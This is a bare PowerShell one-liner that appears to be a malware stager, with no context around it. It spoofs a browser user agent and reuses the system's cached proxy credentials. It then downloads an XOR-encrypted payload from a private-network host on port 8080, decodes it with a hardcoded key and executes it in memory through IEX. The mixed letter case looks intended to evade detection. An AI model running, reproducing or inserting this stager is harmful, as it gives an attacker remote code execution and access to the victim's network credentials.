
$WC=NEW-ObjEcT SySTEM.NEt.WEBCLIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeaDERs.ADD('User-Agent',$u);$Wc.PrOxY = [SYStEm.NEt.WEbRequEST]::DeFAUltWEBPRoxy;$WC.PRoxy.CrEDENTIAls = [SYStem.Net.CRedenTialCaChe]::DeFaULtNEtWoRkCRedEnTIALS;$K='W?9nCa`u12hUg[5o_AJ^tG&!.k:lETBx';$I=0;[ChAR[]]$b=([ChaR[]]($wC.DoWNLOaDSTrinG("http://192.168.52.128:8080/index.asp")))|%{$_-bXOr$K[$i++%$K.LenGTh]};IEX ($b-JoiN'')

